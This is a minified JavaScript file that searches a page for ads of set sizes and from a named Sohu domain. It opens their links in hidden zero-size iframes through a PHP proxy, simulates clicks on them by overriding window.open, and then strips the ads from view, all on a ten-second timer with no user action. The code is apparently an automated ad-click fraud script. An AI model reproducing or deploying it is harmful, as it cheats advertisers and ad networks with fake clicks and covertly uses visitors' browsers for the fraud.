var init=function(){if(!$){window.$=window.jQuery}};init();var triggerEvent=function(e,n){var t=document.createEvent("HTMLEvents");t.initEvent(n,true,true);e.dispatchEvent(t);$(e).trigger(n)};var isNotUrl=function(e){if(!e||e.indexOf("javascript:")===0){return true}return false};var map={};var rect={};var findAdsWithSize=function(e,n,t){var i=$("html");if(t){i=$(t).contents()}return i.find("a#res0,img,iframe,embed,object").filter(function(t,i){var r=$(i);if(r.width()==e&&r.height()==n){return true}return false})};var findAdsWithDomain=function(e,n,t,i){var r=$("html");if(i){r=$(i).contents()}return r.find("iframe").filter(function(i,r){var a=$(r);var o=$(r).attr("src");if(o&&o.indexOf(e)>-1&&o.indexOf(e)<9){if(a.width()==n&&a.height()==t){return true}}return false})};var openAds=function(e,n,t){if(n==undefined||t==undefined){n=rect.width;t=rect.height}var i=$("<iframe height=0 width=0 />");$("body").append(i);i.on("load",function(e){$(this).remove();$(".iframe-ads-"+n+"-"+t).remove();if(map[n+"*"+t]){var i=map[n+"*"+t];for(var r=0;r<i.length;r++){if(i[r].parent().tagName==="BODY"){i[r].remove()}else{i[r].parent().remove()}}map[n+"*"+t]=[]}});i.get(0).src=e};var openIframeAds=function(e,n,t){var i=$('<iframe class="'+"iframe-ads-"+n+"-"+t+'" height=0 width=0 />');$("body").append(i);i.on("load",function(e){autoOpenAds(n,t,this)});i.get(0).src="/PHPProxy/phpproxy.php?url="+encodeURIComponent(e)};var autoOpenAds=function(e,n,t){var i=null;if(t&&t.contentWindow){i=t.contentWindow.open;t.contentWindow.open=openAds}var r=findAdsWithSize(e,n,t);if(r.length<1){return false}if(r.get(0).tagName==="IFRAME"){var a=r.attr("src");if(!a||a.indexOf(location.host)>-1&&a.indexOf(location.host)<9){autoOpenAds(e,n,r.get(0))}else{openIframeAds(a,e,n);if(map[e+"*"+n]){map[e+"*"+n].push(r)}else{map[e+"*"+n]=[r]}}}else{var o=null;if(r.get(0).tagName==="A"){o=r}if(!o){o=r.siblings("a")}if(o.length===0){o=r.parents("a")}if(o.length===0){o=r.prev()}rect={width:e,height:n};if(isNotUrl(o.attr("href"))){var f=window.open;window.open=openAds;triggerEvent(o.get(0),"click");window.open=f}else{openAds(o.attr("href"),e,n)}if(map[e+"*"+n]){map[e+"*"+n].push(o)}else{map[e+"*"+n]=[o]}}if(t&&t.contentWindow){t.contentWindow.open=i}return true};var autoOpenDomainAds=function(e,n,t,i,r,a){var o=findAdsWithDomain(e,n,t,a);if(o.length<1){return false}var f=o.attr("src");openIframeAds(f,i,r);if(map[i+"*"+r]){map[i+"*"+r].push(o)}else{map[i+"*"+r]=[o]}return true};setTimeout(function(){autoOpenAds(300,250);autoOpenAds(728,90);autoOpenDomainAds("changyan.sohu.com",650,320,728,90)},1e4);